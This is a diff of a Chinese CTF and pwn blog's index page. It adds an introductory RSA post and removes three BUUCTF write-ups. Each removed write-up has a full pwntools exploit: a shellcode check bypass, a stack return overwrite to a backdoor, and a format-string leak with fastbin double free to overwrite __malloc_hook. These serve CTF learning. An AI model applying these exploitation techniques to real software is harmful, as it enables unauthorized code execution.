@@ -141,6 +141,64 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/10/08/rsa算法/" >rsa算法</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-10-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>久闻大名，ctf的密码学题目，easyRSA</p>
+<p>因为实验里面需要加密解密，就看了下这个使用最为广泛的非对称加密算法。</p>
+</blockquote>
+<ul>
+<li><a href="https://www.bilibili.com/video/BV14y4y1272w?from=search&seid=10798640508792660489&spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频1</a></li>
+<li><a href="https://www.bilibili.com/video/BV1kE411h7ui?from=search&seid=10798640508792660489&spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频2</a></li>
+<li><a href="https://www.bilibili.com/video/BV1sZ4y1H7WC?from=search&seid=10798640508792660489&spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频3</a></li>
+</ul>
+<p>加密的宏观上：为了能让Bob安全的给Alice发送消息。</p>
+<p>首先Alice生成公钥和私钥（对应锁和钥匙），然后Alice将锁给Bob，那么Bob用锁给信息加密后，将加密后的东西还给Alice，Alice用钥匙解密即可拿到Bob的信息。但是其他人虽然能看到锁，但是无法解密，因为没有钥匙。</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210910190119327.png" alt="image-20210910190119327"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>模运算是单向运算</p>
+<p>有e容易求c，但是有c难求e</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910190422813.png" alt="image-20210910190422813"></p>
+<p>加密解密过程：e和N是给大家都能看到，但是d是Alice持有的钥匙，只有Alice能计算的</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910190457576.png" alt="image-20210910190457576"></p>
+<p>mod的模数e和余数c是互质的，所以上面吧m^e带入下面的c得到下面公式</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910191513110.png" alt="image-20210910191513110"></p>
+<h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>定理</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910190649163.png" alt="image-20210910190649163"></p>
+<p>所以建立式子</p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910190538216.png" alt="image-20210910190538216"></p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910191715034.png" alt="image-20210910191715034"></p>
+<p><img src="/2021/10/08/rsa%E7%AE%97%E6%B3%95/rsa%E7%AE%97%E6%B3%95%5Cimage-20210910191737898.png" alt="image-20210910191737898"></p>
+<p>所以，取两个质数，p*q=n</p>
+<p>其他人来说：已知n，但φ(n)难以求解</p>
+<p>拥有私钥p、q的人来说：p和q因为是质数很好求容易求得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">φ(n)&#x3D;φ(p)*φ(q)&#x3D;(p-1)*(q-1)</span><br></pre></td></tr></table></figure>
+
+<p>就可以求得d，成功解出答案</p>
+
+	
+	</div>
+  <a type="button" href="/2021/10/08/rsa算法/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/08/26/leetcode之算法学习计划/" >leetcode之算法学习计划</a>
 		</h3>
 		</div>
@@ -2387,100 +2445,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/05/08/buu每日一题（4）/" >buu每日一题（4）</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-05-08  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h2><blockquote>
-<p>tql，shellcode的题新花样</p>
-</blockquote>
-<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
-<p>mmap开辟空间，输入shellcode，然后绕过检查即可执行shellcode</p>
-</blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205132913.png" alt="image-20210506205132913"></p>
-<blockquote>
-<p>要绕过检查，令第一个字符为空即可。</p>
-</blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205233682.png" alt="image-20210506205233682"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了让shellcode正常执行，需要构造一条合法以\x00开头的语句。</p>
-<p><code>\x00b\x00</code>、<code>\x00b\x22</code>都是合法语句。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#\x00b\x00</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f77a00c1000</span><br><span class="line">0x7f77a00c1000:	0x2fb848686a006200&lt;&#x3D;	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7f77a00c1000</span><br><span class="line">   0x7f77a00c1000:	add    BYTE PTR [rdx+0x0],ah</span><br><span class="line">   0x7f77a00c1003:	push   0x68</span><br><span class="line">#三个字节组成一个语句</span><br><span class="line"></span><br><span class="line">#同理</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fb05ae4b000</span><br><span class="line">0x7fb05ae4b000:	0x2fb848686a226200	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7fb05ae4b000</span><br><span class="line">   0x7fb05ae4b000:	add    BYTE PTR [rdx+0x22],ah</span><br><span class="line">   0x7fb05ae4b003:	push   0x68</span><br></pre></td></tr></table></figure>
-
-<p>所以，只要在shellcode之前加入’\x00b\x00’即可绕过检查，并正常执行shellcode</p>
-<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./starctf_2019_babyshell"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",27975)</span></span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00b\x22'</span>+asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a>wustctf2020_name_your_cat</h2><blockquote>
-<p>简单的栈题，覆盖返回地址为后门函数即可。</p>
-<p>但是不知道为什么，，发送数据为一个地址的话，会导致程序崩溃（无法正常进行下一次的循环），所以要把发送后门地址放在最后一个。</p>
-</blockquote>
-<p>程序流程：</p>
-<ol>
-<li>for循环五次</li>
-<li>输入一个数字</li>
-<li>往8*v+base的地方发送7个字符的数据</li>
-</ol>
-<p>但是程序没有检查输入的数字大小，而base位于<code>[ebp-34h]</code>的地址，所以在0x34+4的位置存储的就是返回地址，也就是数字7（0x38/8=7），发送后门函数的地址即可。</p>
-<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",26079)</span></span><br><span class="line">elf = ELF(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">shell = <span class="number">0x080485CB</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"which"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"Give your name plz: "</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">1</span>,p64(shell))</span><br><span class="line">add(<span class="number">7</span>,p64(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><blockquote>
-<p>printf+uaf</p>
-<p>一开始没看到格式化字符串，，，TAT</p>
-<p>emm，格式化字符串，泄露%3$p的位置，，，和远程貌似有点不对。。。。<del>知道泄露栈上数据，但是太前面了，gdb都没找到，可以尽量在10附近左右看看</del></p>
-</blockquote>
-<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
-<li><p>格式化字符串部分</p>
-<blockquote>
-<p>可以输入19个字节，只需要前14个字节可以匹配成功即可。</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220553456.png" alt="image-20210507220553456"></p>
-<blockquote>
-<p>前面输入的字符串，存在格式化字符串，有5个字节可以利用，可以用来泄露libc地址</p>
-</blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220712091.png" alt="image-20210507220712091"></p>
-<ol start="2">
-<li>正常堆体<ol>
-<li>add功能：创建0~0x70大小的块</li>
-<li>修改：没有溢出</li>
-<li>释放：uaf，其实可以直接修改uaf，不用double free</li>
-<li>打印</li>
-</ol>
-</li>
-</ol>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
-<li>根据格式化字符串，泄露libc地址</li>
-<li>根据uaf，申请块到mallochook</li>
-<li>覆盖malloc_hook为gadget即可</li>
-</ol>
-<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./gyctf_2020_some_thing_interesting")</span></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",27779)</span></span><br><span class="line"><span class="comment"># p = process(["./gyctf_2020_some_thing_interesting"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line">p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./gyctf_2020_some_thing_interesting"</span>],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">"./gyctf_2020_some_thing_interesting"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Input your code please:"</span>)</span><br><span class="line">	<span class="comment"># p.sendline("OreOOrereOOreO%3$p")</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	p.sendline(<span class="string">"OreOOrereOOreO%13$p"</span>)</span><br><span class="line">init()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"want to do :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"OreOOrereOOreO0x"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(o_size,o_content,re_size,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">	p.sendline(str(o_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE's length : "</span>)</span><br><span class="line">	p.sendline(str(re_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(oid,o_content,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">xie = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)- <span class="number">0xf0</span></span><br><span class="line">libc_base = xie -libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.success(hex(xie))</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(1,'a',p64(fake_chunk))</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget = [0x3f3f6,0x3f44a,0xd5c17]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>,<span class="number">0x68</span>,<span class="string">'b'</span>*<span class="number">0x13</span>+p64(onegadget[<span class="number">3</span>]+libc_base))</span><br><span class="line"><span class="comment"># log.success(hex(onegadget[0]+libc_base))</span></span><br><span class="line"><span class="comment"># p.recvuntil("#######################\n")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>本题首先需要细心，能发现格式化字符串，其次，格式化的话，需要找到栈上，在比较后面，stack 30第一个也是%12$p</p>
-</blockquote>
-
-	
-	</div>
-  <a type="button" href="/2021/05/08/buu每日一题（4）/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -2569,45 +2533,45 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
+			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
 		
-			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
-		
-			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
-		
-			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
-		
-			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
-		
-			<li><a href="/tags/leetcode/">leetcode<span>2</span></a></li>
-		
-			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
-		
-			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
-		
-			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
-		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
-		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
-		
-			<li><a href="/tags/flair/">flair<span>1</span></a></li>
-		
-			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
-		
-			<li><a href="/tags/dasctf/">dasctf<span>1</span></a></li>
-		
-			<li><a href="/tags/《操作系统真相还原》/">《操作系统真相还原》<span>1</span></a></li>
+			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
 		
 			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
 		
-			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
+			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
+		
+			<li><a href="/tags/leetcode/">leetcode<span>2</span></a></li>
 		
 			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
 		
-			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/buu刷题/">buu刷题<span>4</span></a></li>
+			<li><a href="/tags/book/">book<span>1</span></a></li>
+		
+			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
+		
+			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
+		
+			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
+		
+			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+		
+			<li><a href="/tags/安装/">安装<span>1</span></a></li>
+		
+			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
+		
+			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
+		
+			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
+		
+			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
+		
+			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
+		
+			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
+		
+			<li><a href="/tags/git/">git<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>34</span></a></li>
@@ -2623,6 +2587,10 @@ var _hmt = _hmt || [];
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/10/08/rsa算法/" ><i class="fa fa-file-o"></i>rsa算法</a>
+      </li>
+    
+      <li>
         <a href="/2021/08/26/leetcode之算法学习计划/" ><i class="fa fa-file-o"></i>leetcode之算法学习计划</a>
       </li>
     
@@ -2636,10 +2604,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/06/06/os真象还原/" ><i class="fa fa-file-o"></i>os真象还原-笔记</a>
-      </li>
-    
-      <li>
-        <a href="/2021/06/05/kernel-study/" ><i class="fa fa-file-o"></i>kernel study</a>
       </li>
     
   </ul>
